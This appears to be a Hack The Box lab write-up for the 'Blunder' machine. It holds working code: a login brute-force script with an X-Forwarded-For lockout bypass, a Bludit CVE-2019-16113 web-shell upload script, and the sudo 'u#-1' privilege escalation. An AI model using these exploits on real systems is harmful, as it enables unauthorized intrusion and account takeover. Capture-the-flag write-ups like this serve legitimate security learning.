# User

## nmapAutomator

```shell-session
╭─zoey@nomadic ~/htb/tools/nmapAutomator ‹master*›
╰─$ ./nmapAutomator.sh 10.10.10.191 Basic

Running a Basic scan on 10.10.10.191

Host is likely running Linux



---------------------Starting Nmap Quick Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 23:01 PDT
Nmap scan report for blunder.htb (10.10.10.191)
Host is up (0.076s latency).
Not shown: 998 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds



---------------------Starting Nmap Basic Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 23:01 PDT
Nmap scan report for blunder.htb (10.10.10.191)
Host is up (0.080s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds



---------------------Finished all Nmap scans---------------------


Completed in 18 seconds
```

## http://blunder.htb

After some enumeration we find that the software being using for the site is bludit(https://github.com/bludit/bludit). Taking a look at the
available vulnerabilities shows a few that allow RCE, but they all require authentication. After manual enumeration of the site, there's not
much available beyond the admin login and a few content pages. Lets try some fuzzing.

### gobuster

```shell-session
╭─zoey@nomadic ~/htb/blunder ‹master*›
╰─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .php,.html,.htm,.txt,.log,.xml -u http://blunder.htb -o gob-common-extensions.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://blunder.htb
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     php,html,htm,txt,log,xml
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/05/31 01:08:18 Starting gobuster
===============================================================
http://blunder.htb/.htaccess (Status: 403) [Size: 276]
http://blunder.htb/.htaccess.php (Status: 403) [Size: 276]
http://blunder.htb/.htaccess.html (Status: 403) [Size: 276]
http://blunder.htb/.htaccess.htm (Status: 403) [Size: 276]
http://blunder.htb/.htaccess.txt (Status: 403) [Size: 276]
http://blunder.htb/.htaccess.log (Status: 403) [Size: 276]
http://blunder.htb/.htaccess.xml (Status: 403) [Size: 276]
http://blunder.htb/.htpasswd (Status: 403) [Size: 276]
http://blunder.htb/.htpasswd.log (Status: 403) [Size: 276]
http://blunder.htb/.htpasswd.xml (Status: 403) [Size: 276]
http://blunder.htb/.htpasswd.php (Status: 403) [Size: 276]
http://blunder.htb/.htpasswd.html (Status: 403) [Size: 276]
http://blunder.htb/.htpasswd.htm (Status: 403) [Size: 276]
http://blunder.htb/.htpasswd.txt (Status: 403) [Size: 276]
http://blunder.htb/.hta (Status: 403) [Size: 276]
http://blunder.htb/.hta.txt (Status: 403) [Size: 276]
http://blunder.htb/.hta.log (Status: 403) [Size: 276]
http://blunder.htb/.hta.xml (Status: 403) [Size: 276]
http://blunder.htb/.hta.php (Status: 403) [Size: 276]
http://blunder.htb/.hta.html (Status: 403) [Size: 276]
http://blunder.htb/.hta.htm (Status: 403) [Size: 276]
http://blunder.htb/0 (Status: 200) [Size: 7561]
http://blunder.htb/about (Status: 200) [Size: 3280]
http://blunder.htb/admin (Status: 301) [Size: 0]
http://blunder.htb/cgi-bin/ (Status: 301) [Size: 0]
http://blunder.htb/install.php (Status: 200) [Size: 30]
http://blunder.htb/LICENSE (Status: 200) [Size: 1083]
http://blunder.htb/robots.txt (Status: 200) [Size: 22]
http://blunder.htb/robots.txt (Status: 200) [Size: 22]
http://blunder.htb/server-status (Status: 403) [Size: 276]
http://blunder.htb/todo.txt (Status: 200) [Size: 118]
===============================================================
2020/05/31 01:13:30 Finished
===============================================================
```

Running gobuster with common words and extensions results in a `todo.txt` file with the following contents:

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Looks like we have a potential username. Lets build a wordlist to try and brute-force our way in.

## Cewl

Cewl will allow to us spider the site and collect words for a wordlist

```shell-session
╭─zoey@nomadic ~
╰─$ cewl --depth 5 -m 4 http://blunder.htb -w cewl-wordlist
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
╭─zoey@nomadic ~
╰─$ cat cewl-wordlist
Load
Plugins
Page
King
more
with
service
Stadia
devices
from
Begin
been
Google
games
Include
Site
Post
Cover
image
Title
Creation
date
November
Reading
time
minute
Breaked
content
...
```

## Brute-Forcing the Login

During our investigation of CVEs, we came across a brute-force mitigation bypass. Looking at the references we find a proof of concept written in
python(https://rastating.github.io/bludit-brute-force-mitigation-bypass/). Lets modify it for our own purposes.

```python
#!/usr/bin/env python3
import re
import requests
import random
import socket
import struct

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
with open('cewl-wl', 'r+') as f:
    wordlist = [line.rstrip('\n') for line in f.readlines()]

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

And now lets run it:

```shell-session
╭─zoey@nomadic ~/htb/blunder ‹master*›
╰─$ ./brute-force-bludit.py
[*] Trying: Load
[*] Trying: Plugins
[*] Trying: and
[*] Trying: for
[*] Trying: Include
[*] Trying: Site
[*] Trying: Page
[*] Trying: has
[*] Trying: About
[*] Trying: King
[*] Trying: with
[*] Trying: USB
[*] Trying: Begin
[*] Trying: more
[*] Trying: End
[*] Trying: service
[*] Trying: from
[*] Trying: Stadia
[*] Trying: Dynamic
[*] Trying: tag
[*] Trying: blunder
[*] Trying: interesting
[*] Trying: facts
...
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```

## RCE

We know from earlier enum there are RCE exploits for bludit, lets try CVE-2019-16113. The only reference is a github issue(https://github.com/bludit/bludit/issues/1081),
but it has a detailed description. First we upload a jpg file with with php contents, then we upload an `.htaccess` file that allows executing
jpg files as php scripts. This works because the `uuid` value is user-configurable and we can do path traversal, and the `.htaccess` file
is uploaded to a temporary directory. We can try it the first time in burp, but then lets script our way back in:

```sh
#!/bin/sh

# get cookie and csrf token
curl -v 'http://10.10.10.191/admin/' > /tmp/bludit-request 2>&1
cookie=$(cat /tmp/bludit-request | grep 'Set-Cookie' | sed -nr 's/^.*BLUDIT-KEY=(.+); path.*$/\1/p')
csrf_token=$(cat /tmp/bludit-request | grep 'jstokenCSRF' | sed -nr 's/^.*value="(.*)">$/\1/p')

# login
curl --silent 'http://10.10.10.191/admin/login' -H "Cookie: BLUDIT-KEY=${cookie}" --data "tokenCSRF=${csrf_token}&username=fergus&password=RolandDeschain&save=" >/dev/null

# create evil.jpg
echo '<?php system($_GET[1]); ?>' > /tmp/evil.jpg

# create .htaccess file
echo "RewriteEngine off
AddType application/x-httpd-php .jpg" > /tmp/.htaccess

# get new csrf token
csrf_token=$(curl --silent 'http://10.10.10.191/admin/new-content' -H "Cookie: BLUDIT-KEY=${cookie}" | grep "var tokenCSRF = " | sed -nr 's/.*= "(.*)";/\1/p')

# upload evil.jpg
curl --silent -F "images[]=@/tmp/evil.jpg" 'http://10.10.10.191/admin/ajax/upload-images' -H "Cookie: BLUDIT-KEY=${cookie}" -F "uuid=../../tmp/evil" -F "tokenCSRF=${csrf_token}" > /dev/null

# and another csrf token
csrf_token=$(curl --silent 'http://10.10.10.191/admin/new-content' -H "Cookie: BLUDIT-KEY=${cookie}" | grep "var tokenCSRF = " | sed -nr 's/.*= "(.*)";/\1/p')

# upload .htaccess to tmp folder
curl --silent -F "images[]=@/tmp/.htaccess" 'http://10.10.10.191/admin/ajax/upload-images' -H "Cookie: BLUDIT-KEY=${cookie}" -F "uuid=blah-blah-blah" -F "tokenCSRF=${csrf_token}" > /dev/null

# Run commands on the new web shell
while true;do
 echo -n "$ "; read cmd
 curl --silent -G "http://10.10.10.191/bl-content/tmp/evil/evil.jpg" --data-urlencode "1=${cmd}"
done
```

## Web Shell Enum

Lets use the RCE above to download socat from our local server and setup a reverse shell(https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

### ftp directory (skip this section if you like)

Then lets check the ftp server directory mentioned in the `todo.txt`, that sounds reasonable. Hmm...a PDF, a gzipped file with no extension,
some json and a `note.txt` file that says:

```
Hey Sophie
I've left the thing you're looking for in here for you to continue my work
when I leave. The other thing is the same although Ive left it elsewhere too.

Its using the method we talked about; dont leave it on a post-it note this time!

Thanks
Shaun
```

Passwords are left on post-it notes! Lets see what we can find, unzip the config file. Hmmm...a wav file, lets play it...and it sounds
like static. Perhaps this is steganography. Lets try and extract with steghide...nope, we either don't know the password or it's a different
method/program. Ok, lets try wavsteg...nevermind, we don't know the parameters. Ah, lets just try cracking the steghide password with stegcracker.
Success! The password is `sophie`. Looks like the output is some base64 encoded data. Lets throw it into cyberchef...and the output is some hex
values. Lets convert from hex...more base64? Convert from base64 again...and we get `fergus`??? WTF? Ok, lets try it as the password for all
the user accounts. Nope, maybe the hex value or the base64 values are passwords...nope. `-_-` Oh, this was left for Sophie so she could continue
Shaun's(fergus's) work, on the public site `-_-` Maybe the box creator set it up as a medium box, but they needed an easy box so they dumbed it
down and just closed off the ftp port, and threw a `todo.txt` on the web server.

### Screenshots (Also kinda skippable)

In the user `shaun`'s home directory are two screenshots. Hmmm...one actually has a root flag in it? Shit, did someone leave this here by accident
and there's some way to connect to the display manager? Better reset to make sure...Nope. Well, maybe the info will come in later on after I get user
(it won't `-_-`). The other screenshot shows a php file in the `databases` folder. Lets check those out.

### databases/users.php

Checking the web directories for interesting information, we find that there's actually two instances. Bludit is a flat file CMS, and the data is
stored in php files. When we check the users.php files in each instance we find some hashed passwords and salts:

```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    }
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Since the second one doesn't seem to have a salt, lets try throwing it into `https://crackstation.net/`. Success, the password is `Password120`.

## Owning User

Looks like this password works for the `hugo` user, which we had to `su` to since there's no ssh port. Grab user.txt.

# Owning Root

Since we've got the password lets try `sudo -l`. Interesting, what does "(ALL, !root)" mean? Lets google `sudo "ALL, !root"` and we find
https://www.theregister.com/2019/10/14/linux_sudo_security_bug/. Lets give it a try:

```shell-session
hugo@blunder:~$ sudo -l
Password:
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$ sudo -u#-1 bash
root@blunder:/home/hugo# cd /root
root@blunder:/root# cat root.txt
e236***********************bd908
```
